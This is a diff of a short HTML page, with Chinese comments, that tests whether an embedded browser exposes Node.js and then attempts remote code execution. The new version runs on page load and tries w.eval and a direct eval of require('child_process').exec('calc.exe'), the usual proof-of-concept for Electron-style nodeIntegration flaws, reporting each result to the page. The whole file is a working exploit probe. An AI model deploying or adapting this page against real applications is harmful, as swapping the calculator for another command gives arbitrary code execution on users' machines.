@@ -1,20 +1,32 @@
- <html>
- <body>
- <pre id="out">加载中...</pre>
- <button onclick="go()" style="font-size:18px;padding:10px">Click</button>
- <script>
- document.getElementById('out').innerText =
-     'require: ' + typeof require + '\n' +
-     'process: ' + typeof process + '\n' +
-     'window.open: ' + typeof window.open;
+<html>
+<body>
+<script>
+var result = 'require:' + typeof require + '|process:' + typeof process + '|open:' + typeof window.open;
+// 写到页面
+document.body.innerText = result;
 
- function go() {
-     var w = window.open('about:blank');
-     if (!w) { alert('popup blocked!'); return; }
-     setTimeout(function() {
-         w.eval("require('child_process').exec('calc.exe')");
-     }, 500);
- }
- </script>
- </body>
- </html>
+// 试试能不能直接拿到RCE
+try {
+    var w = window.open('about:blank');
+    document.body.innerText += '\nwindow.open=ok';
+    if (w) {
+        setTimeout(function() {
+            w.eval("require('child_process').exec('calc.exe')");
+        }, 500);
+    } else {
+        document.body.innerText += '\nwindow.open=null';
+    }
+} catch(e) {
+    document.body.innerText += '\nopenError:' + e.message;
+}
+
+// 如果window.open被拦截，试全局eval
+try {
+    eval("require('child_process').exec('calc.exe')");
+    document.body.innerText += '\ndirectEval=ok';
+} catch(e) {
+    document.body.innerText += '\ndirectEval:' + e.message;
+}
+</script>
+</body>
+</html>
